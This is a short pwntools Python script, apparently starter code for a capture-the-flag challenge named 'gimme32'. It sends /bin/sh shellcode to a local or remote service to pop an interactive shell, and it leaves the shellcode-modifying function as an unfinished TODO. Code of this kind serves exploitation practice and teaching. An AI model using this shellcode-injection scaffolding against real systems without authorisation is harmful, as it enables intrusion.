from pwn import *

context.binary = binary = ELF("gimme32")

def hax(shellcode: bytes) -> bytes:
    # TODO: Modify shellcode to satisfy the condition
    return shellcode

def exploit() -> None:
    # FIXME: Why couldn't pop a shell..
    shellcode: bytes = hax(asm(shellcraft.sh()))
    conn.sendafter(b"Gimme size: ", p32(len(shellcode)))
    conn.sendafter(b"Gimme code: ", shellcode)
    conn.recvline()
    conn.interactive()

# Below boilerplate could be ignored. :)
if __name__ == "__main__":
    if "REMOTE" in args:
        context.log_file = "remote.log"
        conn = remote(args.HOST, args.PORT)
    elif "ATTACH" in args:
        if os.getenv("TERM_PROGRAM") != "tmux":
            error("This must run in tmux session when debugging")
        context.terminal = ["tmux", "splitw", "-v"]
        context.log_file = "local-debug.log"
        context.log_level = "debug"
        conn = process([binary.path])
        gdb.attach(conn)
        input("Waiting for debugger...")
    else:
        context.log_file = "local.log"
        conn = process([binary.path], aslr=True)

    exploit()
